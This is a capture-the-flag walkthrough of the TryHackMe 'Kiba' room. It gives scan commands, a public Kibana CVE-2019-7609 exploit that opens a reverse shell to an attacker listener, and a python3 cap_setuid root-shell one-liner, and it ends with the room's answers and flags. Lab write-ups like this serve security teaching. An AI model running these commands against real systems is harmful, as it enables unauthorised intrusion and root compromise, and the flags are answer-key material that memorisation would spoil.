# Kiba - Easy

```shell
nmap -T4 -p- -A -v 10.10.100.2

feroxbuster -u http://10.10.100.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#get exploit from Github
python2 CVE-2019-7609-kibana-rce.py -h

#setup listener in another tab
nc -nvlp 4444

python2 CVE-2019-7609-kibana-rce.py -u http://10.10.100.2:5601 -host 10.14.31.212 -port 4444 --shell

#we get reverse shell
cat /home/kiba/user.txt

#to check capabilities
getcap -r / 2>/dev/null

#exploit python3 capabilities from GTFObins
/home/kiba/.hackmeplease/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'

#we are root
cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18
  * 5044 - lxi-evntsvc
  * 5601 - esmagent

* We can explore the webpage; the site gives us the clue "Linux capabilities".

* Googling for "prototype-based inheritance vulnerability" gives us results for prototype pollution and a particular CVE for an exploit in Kibana.

* Researching on this topic leads us to more clues and gives us the CVE required.

* Checking the webpage on port 5601 leads us to the Kibana dashboard.

* We can get the version by checking the Management tab in the webpage.

* Now, using the CVE number and the version, we can get exploits available on Github to get reverse shell.

* We can get user flag in /home/kiba

* Using the hint "capabilities", we can check capabilities with the help of 'getcap' utility.

* We get a capability which can be exploited as it is included in GTFObins:

    ```/home/kiba/.hackmeplease/python3 = cap_setuid+ep```

* Following the exploit given in GTFObins, we get root shell.

```markdown
1. What is the vulnerability that is specific to programming languages with prototype-based inheritance? - Prototype pollution

2. What is the version of visualization dashboard installed in the server? - 6.5.4

3. What is the CVE number for this vulnerability? - CVE-2019-7609

4. Compromise the machine and locate user.txt - THM{1s_easy_pwn3d_k1bana_w1th_rce}

5. How would you recursively list all of these capabilities?

6. Escalate privileges and obtain root.txt - THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}
```
